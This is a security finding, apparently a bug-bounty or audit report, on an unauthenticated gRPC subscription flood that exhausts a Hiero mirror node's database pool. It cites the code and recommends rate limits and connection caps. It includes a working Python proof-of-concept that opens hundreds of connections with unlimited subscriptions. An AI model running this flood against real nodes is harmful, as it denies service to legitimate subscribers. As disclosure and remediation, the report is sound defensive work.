### Title
Unauthenticated gRPC Subscription Flood via Unbounded Multi-Connection Resource Exhaustion

### Summary
`ConsensusController.subscribeTopic()` applies no rate limiting, authentication, or per-IP connection cap. The only guard — `maxConcurrentCallsPerConnection = 5` — is scoped per TCP connection, so an attacker opening many connections multiplies that limit arbitrarily. Each subscription spawns persistent database polling threads and retriever queries, enabling a resource exhaustion attack that starves legitimate subscribers of DB connections and CPU.

### Finding Description

**Exact code path:**

`ConsensusController.subscribeTopic()` (lines 43–53) unconditionally accepts every inbound gRPC call and immediately chains it into `topicMessageService::subscribeTopic`:

```java
final var disposable = Mono.fromCallable(() -> toFilter(request))
        .flatMapMany(topicMessageService::subscribeTopic)   // no guard before this
        .map(this::toResponse)
        .onErrorMap(ProtoUtil::toStatusRuntimeException)
        .subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);
``` [1](#0-0) 

`TopicMessageServiceImpl.subscribeTopic()` (lines 59–92) then creates, for every subscription:
- A historical retriever `Flux` that polls the DB repeatedly (default every 2 s, up to 5 000 rows/page)
- A live listener `Flux` (polling every 500 ms)
- A safety-check `Flux` on `Schedulers.boundedElastic()` that fires an additional DB query after 1 s if no data arrives [2](#0-1) 

**The only throttle that exists** is `maxConcurrentCallsPerConnection = 5`, applied in `GrpcConfiguration`:

```java
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
``` [3](#0-2) 

This is a **per-TCP-connection** Netty limit. No maximum number of connections, no per-IP limit, and no global subscription cap is configured. The `subscriberCount` gauge (line 52–55 of `TopicMessageServiceImpl`) is metrics-only and enforces nothing. [4](#0-3) 

The `web3` module has a full `ThrottleConfiguration` with bucket4j rate limiting, but **no equivalent exists in the `grpc` module**. [5](#0-4) 

**Root cause:** The failed assumption is that `maxConcurrentCallsPerConnection` bounds total server load. It does not — it only bounds calls per single connection, and an attacker controls how many connections they open.

### Impact Explanation

Each attacker-controlled subscription holds open a DB polling loop. With N connections × 5 calls each, the attacker creates 5N concurrent subscriptions, each issuing DB queries every 500 ms–2 s. The gRPC DB pool (`hiero.mirror.grpc.db.statementTimeout = 10 000 ms`) will be saturated, causing legitimate subscribers to time out waiting for a DB connection. Historical message delivery becomes inconsistent or fails entirely for real clients. The `boundedElastic` scheduler used by the safety-check flux is also a finite resource that can be exhausted.

### Likelihood Explanation

No authentication is required — the gRPC port (default 5600) is publicly reachable. A single attacker machine can open thousands of TCP connections with standard tooling (e.g., `grpcurl` in a loop, or a trivial Go/Python gRPC client). The attack is repeatable and requires no special knowledge beyond the publicly documented API shown in `docs/grpc/README.md`:

```
grpcurl -plaintext -d '{"topicID": {"topicNum": 41110}, "limit": 0}' localhost:5600 \
  com.hedera.mirror.api.proto.ConsensusService/subscribeTopic
``` [6](#0-5) 

Setting `limit: 0` (unlimited) and a `consensusStartTime` far in the past maximises historical DB load per subscription.

### Recommendation

1. **Add a global concurrent-subscription cap** in `TopicMessageServiceImpl.subscribeTopic()`: reject new subscriptions when `subscriberCount` exceeds a configurable threshold.
2. **Add per-IP connection limiting** at the Netty layer via a `ChannelHandler` or an ingress/proxy rule.
3. **Add a gRPC-level rate limiter** (bucket4j or Resilience4j) analogous to `ThrottleConfiguration` in the `web3` module, applied before `topicMessageService::subscribeTopic` is invoked in `ConsensusController`.
4. **Set `maxConnectionAge`** on the `NettyServerBuilder` to force connection recycling and prevent indefinite resource holding.

### Proof of Concept

```python
import grpc, threading
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
from com.hederahashgraph.api.proto.java import basic_types_pb2, timestamp_pb2

TARGET = "mirror-node-host:5600"
NUM_CONNECTIONS = 500   # 500 connections × 5 calls = 2500 concurrent subscriptions

def flood():
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    req = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=1),
        consensusStartTime=timestamp_pb2.Timestamp(seconds=0),  # from genesis
        limit=0  # unlimited
    )
    for _ in range(5):  # saturate maxConcurrentCallsPerConnection
        threading.Thread(target=lambda: list(stub.subscribeTopic(req)), daemon=True).start()

threads = [threading.Thread(target=flood) for _ in range(NUM_CONNECTIONS)]
for t in threads: t.start()
for t in threads: t.join()
# DB connection pool exhausted; legitimate subscribers receive errors or stall
```

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/controller/ConsensusController.java (L44-48)
```java
        final var disposable = Mono.fromCallable(() -> toFilter(request))
                .flatMapMany(topicMessageService::subscribeTopic)
                .map(this::toResponse)
                .onErrorMap(ProtoUtil::toStatusRuntimeException)
                .subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L50-56)
```java
    @PostConstruct
    void init() {
        Gauge.builder("hiero.mirror.grpc.subscribers", () -> subscriberCount)
                .description("The number of active subscribers")
                .tag("type", TopicMessage.class.getSimpleName())
                .register(meterRegistry);
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L59-92)
```java
    public Flux<TopicMessage> subscribeTopic(TopicMessageFilter filter) {
        log.info("Subscribing to topic: {}", filter);
        TopicContext topicContext = new TopicContext(filter);

        Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
        Flux<TopicMessage> live = Flux.defer(() -> incomingMessages(topicContext));

        // Safety Check - Polls missing messages after 1s if we are stuck with no data
        Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
                .filter(_ -> !topicContext.isComplete())
                .flatMapMany(_ -> missingMessages(topicContext, null))
                .subscribeOn(Schedulers.boundedElastic());

        Flux<TopicMessage> flux = historical
                .concatWith(Flux.merge(safetyCheck, live).takeUntilOther(pastEndTime(topicContext)))
                .filter(t -> {
                    TopicMessage last = topicContext.getLast();
                    return last == null || t.getSequenceNumber() > last.getSequenceNumber();
                });

        if (filter.getEndTime() != null) {
            flux = flux.takeWhile(t -> t.getConsensusTimestamp() < filter.getEndTime());
        }

        if (filter.hasLimit()) {
            flux = flux.take(filter.getLimit());
        }

        return topicExists(filter)
                .thenMany(flux.doOnNext(topicContext::onNext)
                        .doOnSubscribe(s -> subscriberCount.incrementAndGet())
                        .doFinally(s -> subscriberCount.decrementAndGet())
                        .doFinally(topicContext::finished));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L33-33)
```java
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
```

**File:** web3/src/main/java/org/hiero/mirror/web3/config/ThrottleConfiguration.java (L16-55)
```java
public class ThrottleConfiguration {

    public static final String GAS_LIMIT_BUCKET = "gasLimitBucket";
    public static final String RATE_LIMIT_BUCKET = "rateLimitBucket";
    public static final String OPCODE_RATE_LIMIT_BUCKET = "opcodeRateLimitBucket";

    private final ThrottleProperties throttleProperties;

    @Bean(name = RATE_LIMIT_BUCKET)
    Bucket rateLimitBucket() {
        long rateLimit = throttleProperties.getRequestsPerSecond();
        final var limit = Bandwidth.builder()
                .capacity(rateLimit)
                .refillGreedy(rateLimit, Duration.ofSeconds(1))
                .build();
        return Bucket.builder().addLimit(limit).build();
    }

    @Bean(name = GAS_LIMIT_BUCKET)
    Bucket gasLimitBucket() {
        long gasLimit = throttleProperties.getGasPerSecond();
        final var limit = Bandwidth.builder()
                .capacity(gasLimit)
                .refillGreedy(gasLimit, Duration.ofSeconds(1))
                .build();
        return Bucket.builder()
                .withSynchronizationStrategy(SynchronizationStrategy.SYNCHRONIZED)
                .addLimit(limit)
                .build();
    }

    @Bean(name = OPCODE_RATE_LIMIT_BUCKET)
    Bucket opcodeRateLimitBucket() {
        long rateLimit = throttleProperties.getOpcodeRequestsPerSecond();
        final var limit = Bandwidth.builder()
                .capacity(rateLimit)
                .refillGreedy(rateLimit, Duration.ofSeconds(1))
                .build();
        return Bucket.builder().addLimit(limit).build();
    }
```

**File:** docs/grpc/README.md (L16-16)
```markdown
`grpcurl -plaintext -d '{"topicID": {"topicNum": 41110}, "limit": 0}' localhost:5600 com.hedera.mirror.api.proto.ConsensusService/subscribeTopic`
```
